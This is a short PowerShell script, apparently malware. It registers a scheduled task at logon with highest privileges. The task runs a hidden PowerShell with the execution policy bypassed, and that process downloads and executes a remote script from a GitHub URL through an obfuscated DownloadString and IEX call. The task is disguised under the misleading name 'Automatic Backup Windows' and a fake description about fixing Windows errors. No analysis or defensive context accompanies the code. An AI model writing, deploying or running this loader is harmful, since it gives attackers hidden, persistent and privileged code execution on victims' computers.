$os = Get-WmiObject Win32_OperatingSystem
$version_machine = 0

switch ($os.Version) {
    { $_.StartsWith("10.0") } { $version_machine = 10 }
    { $_.StartsWith("6.3") } { $version_machine = 8.1 }
    { $_.StartsWith("6.2") } { $version_machine = 8 }
    { $_.StartsWith("6.1") } { $version_machine = 7 }
    default { Write-Output "Unknown Windows version"; $version_machine = "Unknown" }
}

$powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode')"
$need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need I'E'X($download)" 
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "Automatic Backup Windows $version_machine"
$task_desc = "Always Backup & Fix If Windows $version_machine ERROR. "
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
